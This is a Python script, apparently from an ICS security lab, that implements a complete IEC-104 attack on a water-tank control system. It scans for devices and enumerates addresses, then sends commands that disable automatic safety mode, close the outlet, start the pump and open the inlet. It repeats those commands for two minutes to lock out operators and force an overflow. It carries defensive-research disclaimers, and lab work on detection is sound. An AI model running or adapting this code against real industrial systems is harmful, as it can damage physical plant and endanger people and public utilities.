#!/usr/bin/env python3
"""
IEC-104 Attack Simulation for Security Research
================================================

DISCLAIMER: This script is ONLY for authorized security research and testing
in controlled environments. Unauthorized use against systems you do not own
is illegal and unethical.

This script simulates common IEC-104 attack patterns to:
1. Test detection capabilities
2. Generate malicious traffic signatures
3. Validate security controls

Attack Phases:
1. Network enumeration - Scan for IEC-104 devices
2. Protocol enumeration - Discover COA and IOA addresses
3. Command injection - Send malicious commands to cause system disruption
"""

import socket
import struct
import time
import sys
import logging
from typing import List, Tuple, Optional

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [ATTACKER] - %(levelname)s - %(message)s"
)
logger = logging.getLogger("IEC104_ATTACKER")


class IEC104Attacker:
    """
    IEC-104 Protocol Attacker for Security Research

    Simulates attacks commonly seen in industrial malware such as:
    - HAVEX/Dragonfly (ICS reconnaissance)
    - CRASHOVERRIDE/Industroyer (IEC-104 payload)
    - BlackEnergy (SCADA targeting)
    """

    # IEC-104 APCI constants
    START_BYTE = 0x68

    # APDU types
    I_FORMAT = 0x00  # Information transfer
    S_FORMAT = 0x01  # Supervisory
    U_FORMAT = 0x03  # Unnumbered control

    # U-format functions
    STARTDT_ACT = 0x07  # Start data transfer activation
    STARTDT_CON = 0x0B  # Start data transfer confirmation
    STOPDT_ACT = 0x13   # Stop data transfer activation
    TESTFR_ACT = 0x43   # Test frame activation

    # ASDU Type IDs (relevant for attack)
    C_SC_NA_1 = 45   # Single command
    C_DC_NA_1 = 46   # Double command
    C_SE_NC_1 = 50   # Set point command, short float
    M_SP_NA_1 = 1    # Single point information
    M_ME_NB_1 = 11   # Measured value, scaled value

    # Cause of transmission
    COT_ACTIVATION = 6
    COT_DEACTIVATION = 8
    COT_SPONTANEOUS = 3

    def __init__(self):
        self.sock = None
        self.target_ip = None
        self.target_port = None
        self.send_seq = 0
        self.recv_seq = 0
        self.discovered_coas = []
        self.discovered_ioas = {}

    def scan_network(self, ip_range: str = "127.0.0.1", port_range: Tuple[int, int] = (2404, 2410)) -> List[Tuple[str, int]]:
        """
        Phase 1: Network Enumeration
        Scan for active IEC-104 devices (mimics HAVEX malware behavior)
        """
        logger.info("="*70)
        logger.info("PHASE 1: NETWORK ENUMERATION")
        logger.info("="*70)
        logger.info(f"Scanning {ip_range} ports {port_range[0]}-{port_range[1]}")

        active_targets = []

        # For simplicity, scanning localhost only
        # In real attacks, this would scan entire subnets
        for port in range(port_range[0], port_range[1] + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip_range, port))

                if result == 0:
                    logger.info(f"[+] Port {port} is OPEN on {ip_range}")

                    # Try to identify IEC-104 by sending TESTFR
                    if self._test_iec104_connection(ip_range, port):
                        logger.warning(f"[!] IEC-104 DEVICE FOUND: {ip_range}:{port}")
                        active_targets.append((ip_range, port))
                    else:
                        logger.info(f"[-] Port {port} open but not IEC-104")
                else:
                    logger.debug(f"[-] Port {port} closed")

                sock.close()
            except Exception as e:
                logger.debug(f"Error scanning {ip_range}:{port} - {e}")

        if active_targets:
            logger.warning(f"[!] Found {len(active_targets)} IEC-104 targets")
        else:
            logger.info("[-] No IEC-104 devices found")

        return active_targets

    def _test_iec104_connection(self, ip: str, port: int) -> bool:
        """Test if target speaks IEC-104 protocol"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))

            # Send TESTFR_ACT
            testfr = self._build_u_frame(self.TESTFR_ACT)
            sock.send(testfr)

            # Wait for response
            response = sock.recv(1024)
            sock.close()

            # Check if we got a valid IEC-104 response
            if len(response) >= 6 and response[0] == self.START_BYTE:
                return True

        except Exception as e:
            logger.debug(f"Test connection failed: {e}")

        return False

    def connect(self, ip: str, port: int) -> bool:
        """Establish connection to IEC-104 target"""
        try:
            self.target_ip = ip
            self.target_port = port
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((ip, port))

            logger.info(f"[+] Connected to {ip}:{port}")

            # Send STARTDT
            startdt = self._build_u_frame(self.STARTDT_ACT)
            self.sock.send(startdt)

            # Wait for STARTDT_CON
            response = self.sock.recv(1024)
            if self._is_startdt_con(response):
                logger.info("[+] Data transfer started")
                return True
            else:
                logger.error("[-] STARTDT not confirmed")
                return False

        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def enumerate_coa_ioa(self, coa_range: Tuple[int, int] = (1, 5), ioa_range: Tuple[int, int] = (100, 500)):
        """
        Phase 2: Protocol Enumeration
        Discover Common Address (COA) and Information Object Address (IOA)
        This mimics reconnaissance behavior of CRASHOVERRIDE malware
        """
        logger.info("="*70)
        logger.info("PHASE 2: PROTOCOL ENUMERATION (COA/IOA Discovery)")
        logger.info("="*70)

        logger.info(f"Probing COA range: {coa_range[0]}-{coa_range[1]}")
        logger.info(f"Probing IOA range: {ioa_range[0]}-{ioa_range[1]}")

        # Enumerate COAs
        for coa in range(coa_range[0], coa_range[1] + 1):
            # Send interrogation command (C_IC_NA_1 = 100)
            asdu = self._build_interrogation_command(coa)
            self._send_i_frame(asdu)

            # Wait for response
            try:
                response = self.sock.recv(4096)
                if self._parse_response(response, coa):
                    logger.warning(f"[!] ACTIVE COA FOUND: {coa}")
                    self.discovered_coas.append(coa)

                    # Now enumerate IOAs for this COA
                    self._enumerate_ioas_for_coa(coa, ioa_range)

            except socket.timeout:
                logger.debug(f"[-] COA {coa} - No response")
                continue
            except Exception as e:
                logger.debug(f"Error enumerating COA {coa}: {e}")

        logger.info(f"[+] Enumeration complete. Found {len(self.discovered_coas)} COAs")
        logger.info(f"[+] Discovered IOAs: {self.discovered_ioas}")

    def _enumerate_ioas_for_coa(self, coa: int, ioa_range: Tuple[int, int]):
        """Enumerate IOA addresses for a specific COA"""
        logger.info(f"  [*] Enumerating IOAs for COA {coa}...")

        self.discovered_ioas[coa] = {
            'measurements': [],
            'status': [],
            'commands': []
        }

        # Common IOA patterns in IEC-104
        test_ioas = list(range(ioa_range[0], ioa_range[1] + 1))

        keepalive_counter = 0
        for ioa in test_ioas:
            # Send keepalive every 20 IOAs to prevent timeout
            keepalive_counter += 1
            if keepalive_counter % 20 == 0:
                logger.debug(f"  [*] Sending keepalive...")
                self._send_keepalive()
            # Send read command
            asdu = self._build_read_command(coa, ioa)
            try:
                self._send_i_frame(asdu)

                # Drain any pending responses first to avoid buffer buildup
                self.sock.setblocking(False)
                try:
                    while True:
                        _ = self.sock.recv(4096)
                except BlockingIOError:
                    pass
                self.sock.setblocking(True)

                time.sleep(0.05)  # Small delay to avoid flooding

                # Set shorter timeout for read responses
                old_timeout = self.sock.gettimeout()
                self.sock.settimeout(0.5)

                try:
                    response = self.sock.recv(4096)
                    ioa_type = self._identify_ioa_type(response, ioa)

                    if ioa_type:
                        logger.info(f"    [+] IOA {ioa}: {ioa_type}")

                        if 'measurement' in ioa_type.lower():
                            self.discovered_ioas[coa]['measurements'].append(ioa)
                        elif 'status' in ioa_type.lower() or 'point' in ioa_type.lower():
                            self.discovered_ioas[coa]['status'].append(ioa)
                        elif 'command' in ioa_type.lower():
                            self.discovered_ioas[coa]['commands'].append(ioa)
                except socket.timeout:
                    pass
                finally:
                    self.sock.settimeout(old_timeout)

            except BrokenPipeError:
                logger.error(f"    [!] Connection lost at IOA {ioa}. Attempting reconnect...")
                if self._reconnect():
                    logger.info("    [+] Reconnected successfully")
                    continue
                else:
                    logger.error("    [-] Reconnection failed. Stopping enumeration.")
                    break
            except Exception as e:
                logger.debug(f"    [-] IOA {ioa} - {e}")
                continue

    def _check_connection(self) -> bool:
        """Check if connection is still alive"""
        try:
            self._send_keepalive()
            return True
        except:
            return False

    def attack_overflow_tank(self, coa: int = 1):
        """
        Phase 3: Malicious Command Injection

        Attack strategy (mimics CRASHOVERRIDE):
        1. Force inlet valve OPEN (constant water inflow)
        2. Force outlet valve CLOSED (prevent drainage)
        3. Force pump ON (accelerate filling)
        4. Disable AUTO mode (prevent safety controls)
        5. Maintain attack state until overflow

        This will trigger:
        - Overflow alarm
        - High pressure alarm
        - Potential tank explosion
        """
        logger.info("="*70)
        logger.info("PHASE 3: MALICIOUS COMMAND INJECTION")
        logger.info("="*70)
        logger.warning("[!] ATTACK: Forcing tank overflow condition")

        # Verify connection health before attack
        if not self._check_connection():
            logger.error("[!] Connection is dead. Reconnecting...")
            if not self._reconnect():
                logger.error("[!] Cannot reconnect. Attack aborted.")
                return
            logger.info("[+] Reconnection successful")

        # Target IOAs (from your system configuration)
        IOA_INLET_VALVE_COMMAND = 300
        IOA_OUTLET_VALVE_COMMAND = 301
        IOA_PUMP_COMMAND = 302
        IOA_AUTO_MODE_COMMAND = 303

        attack_sequence = [
            (IOA_AUTO_MODE_COMMAND, False, "Disable AUTO mode (remove safety controls)"),
            (IOA_OUTLET_VALVE_COMMAND, False, "Close outlet valve (prevent drainage)"),
            (IOA_PUMP_COMMAND, True, "Activate pump (accelerate filling)"),
            (IOA_INLET_VALVE_COMMAND, True, "Open inlet valve (continuous water flow)"),
        ]

        logger.warning("[!] Initiating attack sequence...")

        for ioa, value, description in attack_sequence:
            logger.warning(f"[ATTACK] {description}")
            try:
                self._send_single_command(coa, ioa, value)
                time.sleep(0.5)
            except BrokenPipeError:
                logger.error("[!] Connection lost during attack. Attempting reconnect...")
                if self._reconnect():
                    logger.info("[+] Reconnected. Retrying command...")
                    try:
                        self._send_single_command(coa, ioa, value)
                    except Exception as e:
                        logger.error(f"[!] Retry failed: {e}")
                        return
                else:
                    logger.error("[!] Reconnection failed. Attack aborted.")
                    return
            except Exception as e:
                logger.error(f"[!] Command failed: {e}")
                return

        logger.warning("[!] Attack commands sent. Tank will overflow in ~30-60 seconds")
        logger.warning("[!] Maintaining malicious state...")

        # Continuously resend commands to maintain attack state
        # This prevents operators from regaining control
        attack_duration = 120  # 2 minutes
        start_time = time.time()
        iteration = 0

        while (time.time() - start_time) < attack_duration:
            iteration += 1
            logger.warning(f"[ATTACK] Iteration {iteration} - Reinforcing malicious commands")

            # Resend all attack commands
            for ioa, value, _ in attack_sequence:
                try:
                    self._send_single_command(coa, ioa, value)
                    time.sleep(0.2)
                except Exception as e:
                    logger.error(f"Command failed: {e}")

            # Wait before next iteration
            logger.info(f"[*] Waiting 10 seconds before next iteration...")
            time.sleep(10)

        logger.warning("[!] Attack completed. Tank should be in overflow condition.")

    def _send_single_command(self, coa: int, ioa: int, value: bool):
        """Send a single command (C_SC_NA_1) to control outputs"""
        try:
            # Build ASDU for single command
            asdu = bytearray()

            # Type ID: C_SC_NA_1 (45)
            asdu.append(self.C_SC_NA_1)

            # Variable structure qualifier (1 object)
            asdu.append(0x01)

            # Cause of transmission (Activation)
            asdu.append(self.COT_ACTIVATION)
            asdu.append(0x00)

            # Common address
            asdu.append(coa & 0xFF)
            asdu.append((coa >> 8) & 0xFF)

            # Information object address (3 bytes)
            asdu.append(ioa & 0xFF)
            asdu.append((ioa >> 8) & 0xFF)
            asdu.append((ioa >> 16) & 0xFF)

            # Single command information
            # Bit 0: State (0=OFF, 1=ON)
            # Bit 1-5: Reserved
            # Bit 6: S/E (0=short pulse, 1=long pulse)
            # Bit 7: QU (qualifier of command)
            sco = 0x01 if value else 0x00
            asdu.append(sco)

            self._send_i_frame(bytes(asdu))
            logger.debug(f"Sent command: IOA={ioa}, Value={value}")

            # Try to receive ACK/response
            try:
                old_timeout = self.sock.gettimeout()
                self.sock.settimeout(0.5)
                _ = self.sock.recv(4096)
                self.sock.settimeout(old_timeout)
            except socket.timeout:
                pass

        except BrokenPipeError:
            logger.error(f"Connection lost while sending command to IOA {ioa}")
            raise
        except Exception as e:
            logger.error(f"Error sending command to IOA {ioa}: {e}")
            raise

    def _build_u_frame(self, function: int) -> bytes:
        """Build U-format frame"""
        frame = bytearray()
        frame.append(self.START_BYTE)
        frame.append(0x04)  # Length
        frame.append(function)
        frame.append(0x00)
        frame.append(0x00)
        frame.append(0x00)
        return bytes(frame)

    def _build_i_frame(self, asdu: bytes) -> bytes:
        """Build I-format frame with ASDU"""
        length = len(asdu) + 4

        frame = bytearray()
        frame.append(self.START_BYTE)
        frame.append(length)

        # Send sequence number
        send_seq = (self.send_seq << 1) & 0xFFFF
        frame.append(send_seq & 0xFF)
        frame.append((send_seq >> 8) & 0xFF)

        # Receive sequence number
        recv_seq = (self.recv_seq << 1) & 0xFFFF
        frame.append(recv_seq & 0xFF)
        frame.append((recv_seq >> 8) & 0xFF)

        # ASDU
        frame.extend(asdu)

        self.send_seq = (self.send_seq + 1) & 0x7FFF

        return bytes(frame)

    def _send_i_frame(self, asdu: bytes):
        """Send I-format frame"""
        frame = self._build_i_frame(asdu)
        self.sock.send(frame)

    def _build_interrogation_command(self, coa: int) -> bytes:
        """Build general interrogation command (C_IC_NA_1)"""
        asdu = bytearray()
        asdu.append(100)  # C_IC_NA_1
        asdu.append(0x01)  # 1 object
        asdu.append(self.COT_ACTIVATION)
        asdu.append(0x00)
        asdu.append(coa & 0xFF)
        asdu.append((coa >> 8) & 0xFF)
        asdu.append(0x00)  # IOA = 0
        asdu.append(0x00)
        asdu.append(0x00)
        asdu.append(0x14)  # QOI = 20 (station interrogation)
        return bytes(asdu)

    def _build_read_command(self, coa: int, ioa: int) -> bytes:
        """Build read command (C_RD_NA_1)"""
        asdu = bytearray()
        asdu.append(102)  # C_RD_NA_1
        asdu.append(0x01)
        asdu.append(self.COT_ACTIVATION)
        asdu.append(0x00)
        asdu.append(coa & 0xFF)
        asdu.append((coa >> 8) & 0xFF)
        asdu.append(ioa & 0xFF)
        asdu.append((ioa >> 8) & 0xFF)
        asdu.append((ioa >> 16) & 0xFF)
        return bytes(asdu)

    def _is_startdt_con(self, data: bytes) -> bool:
        """Check if response is STARTDT confirmation"""
        if len(data) >= 6:
            return data[0] == self.START_BYTE and data[2] == self.STARTDT_CON
        return False

    def _parse_response(self, data: bytes, expected_coa: int) -> bool:
        """Parse response to check if COA is active"""
        if len(data) < 12:
            return False

        try:
            # Check start byte
            if data[0] != self.START_BYTE:
                return False

            # Check if it's an I-frame
            if (data[2] & 0x01) == 0:
                # Extract COA from ASDU (bytes 8-9)
                coa = data[8] | (data[9] << 8)
                return coa == expected_coa

        except Exception as e:
            logger.debug(f"Parse error: {e}")

        return False

    def _identify_ioa_type(self, data: bytes, ioa: int) -> Optional[str]:
        """Identify the type of IOA from response"""
        if len(data) < 12:
            return None

        try:
            if data[0] != self.START_BYTE:
                return None

            # Get type ID from ASDU
            type_id = data[6]

            # Map type IDs to descriptions
            type_map = {
                1: "Single point status",
                3: "Double point status",
                9: "Measured value (normalized)",
                11: "Measured value (scaled)",
                13: "Measured value (short float)",
                45: "Single command",
                46: "Double command",
                50: "Setpoint command"
            }

            return type_map.get(type_id, f"Unknown type {type_id}")

        except Exception as e:
            logger.debug(f"Identification error: {e}")

        return None

    def _reconnect(self) -> bool:
        """Attempt to reconnect after connection loss"""
        try:
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass

            # Reset sequence numbers
            self.send_seq = 0
            self.recv_seq = 0

            # Reconnect
            return self.connect(self.target_ip, self.target_port)
        except Exception as e:
            logger.error(f"Reconnection failed: {e}")
            return False

    def _send_keepalive(self):
        """Send TESTFR to keep connection alive"""
        try:
            testfr = self._build_u_frame(self.TESTFR_ACT)
            self.sock.send(testfr)
            # Try to receive response but don't block
            old_timeout = self.sock.gettimeout()
            self.sock.settimeout(0.1)
            try:
                _ = self.sock.recv(1024)
            except socket.timeout:
                pass
            finally:
                self.sock.settimeout(old_timeout)
        except Exception as e:
            logger.debug(f"Keepalive failed: {e}")

    def disconnect(self):
        """Close connection"""
        if self.sock:
            try:
                # Send STOPDT
                stopdt = self._build_u_frame(self.STOPDT_ACT)
                self.sock.send(stopdt)
                time.sleep(0.5)
            except:
                pass

            self.sock.close()
            logger.info("[+] Disconnected")


def main():
    """
    Main attack simulation

    WARNING: This demonstrates attack techniques for DEFENSIVE purposes only
    """
    import argparse
    import os

    # Default target comes from the unified registry (common/targets.py), so the
    # active MRHOTSHOT_PROFILE / targets.yaml drive it. Falls back to the legacy
    # single-PLC address if the registry isn't importable.
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "perform_malware_simulations"))
        from common.targets import registry as _reg
        _def_ip, _def_port = _reg.resolve("legacy", "iec104")
    except Exception:
        _def_ip, _def_port = "192.168.1.6", 2404

    ap = argparse.ArgumentParser(description="IEC-104 attack simulation (defensive research)")
    ap.add_argument("--target", default=_def_ip, help="target IP (default from registry: %(default)s)")
    ap.add_argument("--port", type=int, default=_def_port, help="IEC-104 port (default: %(default)s)")
    ap.add_argument("--yes", action="store_true", help="skip the interactive confirmation prompt")
    args = ap.parse_args()

    logger.info("="*70)
    logger.info("IEC-104 ATTACK SIMULATION - SECURITY RESEARCH TOOL")
    logger.info("="*70)
    logger.warning("DISCLAIMER: For authorized testing in controlled environments ONLY")
    logger.info("="*70)

    attacker = IEC104Attacker()

    try:
        # Phase 1: Network Enumeration
        targets = attacker.scan_network(ip_range=args.target, port_range=(args.port, args.port + 6))

        if not targets:
            logger.error("No targets found. Exiting.")
            return

        # Use first discovered target
        target_ip, target_port = targets[0]

        # Phase 2: Connect and enumerate
        if attacker.connect(target_ip, target_port):
            time.sleep(1)

            # Enumerate COA/IOA (focused on common ranges for water tank system)
            # Measurements: 100-110, Status: 200-210, Commands: 300-310, Setpoints: 400-410
            attacker.enumerate_coa_ioa(coa_range=(1, 2), ioa_range=(100, 410))

            time.sleep(2)

            # Phase 3: Execute attack
            logger.info("\n" + "="*70)
            logger.warning("READY TO EXECUTE ATTACK")
            logger.warning("This will cause the water tank to overflow!")
            logger.info("="*70)

            response = "yes" if args.yes else input("\nContinue with attack? (yes/no): ")
            if response.lower() == 'yes':
                attacker.attack_overflow_tank(coa=1)
            else:
                logger.info("Attack cancelled by user")

    except KeyboardInterrupt:
        logger.info("\n[!] Attack interrupted by user")
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        import traceback
        traceback.print_exc()
    finally:
        attacker.disconnect()


if __name__ == "__main__":
    main()
